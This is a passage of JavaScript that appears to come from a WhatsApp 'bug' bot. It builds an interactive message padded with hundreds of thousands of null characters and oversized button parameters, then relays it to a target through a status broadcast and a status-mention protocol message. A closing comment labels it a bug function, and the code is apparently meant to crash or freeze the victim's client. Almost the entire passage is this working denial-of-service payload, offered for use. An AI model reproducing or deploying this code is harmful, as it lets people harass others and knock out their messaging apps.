                directPath: "/v/t62.7118-24/614455028_1202686655065576_7598631975214445345_n.enc?ccb=11-4&oh=01_Q5Aa4AGtOX5rCouaD5mIpRRRPzRAhNvdgbJH_hQGyQs_TxDH5w&oe=69F381EA&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975930",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA8/sdoRlvKSYzWn4rUSDsFzEvQTVHoZx6MU2MmoKc7BTRlMG7g0QtQap5Zw5nNKmb5RHvsmFoznuo4bvKDRZStAfQ5DV0wKX54FgFf//EACIQAAICAgIDAAMBAAAAAAAAAAABAgMREiFBBCIxEBRhE//aAAgBAQABPwBYZoaGpqaDj+YYMxZGEGWqEUb/AME1IcGOA44E0JHsic22Vpzz/EbclcozisjrhgsrT+EUyuLk8IcJpcxIVStnqirx3VBrssqlHo8euUoZSH64TRYsFWF0VQTbk18I5y9/r+IprhFycVyTdcE3IV9NuyfCPHgtJpLh/D9eS7LarEQUe0LRPKMJ8oSmnL24ZJOeU/gtP9nXohW6LC+ErsdkvJRC5H7ECMo4WDHeSPKyaR23xyeQpQeSdrkOTNsCkynGkS23HqiLSrQn6nlyzWOSQ5mRMpvemO0KzOWxXz1HbJ6rYvm3AbGf/8QAHBEAAwABBQAAAAAAAAAAAAAAAAERIAISITAx/9oACAECAQE/ACG14Jyi1Vj9wRyV9f8A/8QAGREAAgMBAAAAAAAAAAAAAAAAARECECAw/9oACAEDAQE/AKeTFDJ6/wD/2Q==",
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              }
            ],
            hasMediaAttachment: true
          },
          body: {
            text: "woyy"
          },
          urlTrackingMap: {
            urlTrackingMapElements: [
              {
                originalUrl: "\u0000".repeat(2),
                unconsentedUsersUrl: "\u0000".repeat(2),
                consentedUsersUrl: "\u0000".repeat(2),
                cardIndex: 1
              },
              {
                originalUrl: "\u0000".repeat(2),
                unconsentedUsersUrl: "\u0000".repeat(2),
                consentedUsersUrl: "\u0000".repeat(2),
                cardIndex: 2
              }
            ]
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "X" },
              { name: "galaxy_message", buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}" },
              { name: "call_permission_message", buttonParamsJson: "\x10".repeat(10000) }
            ],
            messageParamsJson: "woyy" + "\u0000".repeat(900000)
          },
          contextInfo
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, messageContent, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  await sock.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    }
  );
}
// ~ End Function Bugs